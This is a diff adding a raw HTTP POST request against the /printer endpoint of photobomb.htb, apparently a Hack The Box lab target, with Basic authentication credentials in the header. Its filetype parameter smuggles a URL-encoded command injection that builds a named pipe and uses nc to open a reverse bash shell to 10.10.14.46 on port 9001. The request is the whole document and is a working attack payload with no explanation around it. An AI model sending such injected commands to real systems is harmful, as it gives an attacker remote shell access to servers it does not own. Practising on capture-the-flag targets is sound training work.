@@ -1,0 +1,15 @@
+POST /printer HTTP/1.1
+Host: photobomb.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 204
+Origin: http://photobomb.htb
+Authorization: Basic cEgwdDA6YjBNYiE=
+Connection: close
+Referer: http://photobomb.htb/printer
+Upgrade-Insecure-Requests: 1
+
+photo=nathaniel-worrell-zK_az6W3xIo-unsplash.jpg&filetype=png;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.46%209001%20%3E%2Ftmp%2Ff&dimensions=3000x2000
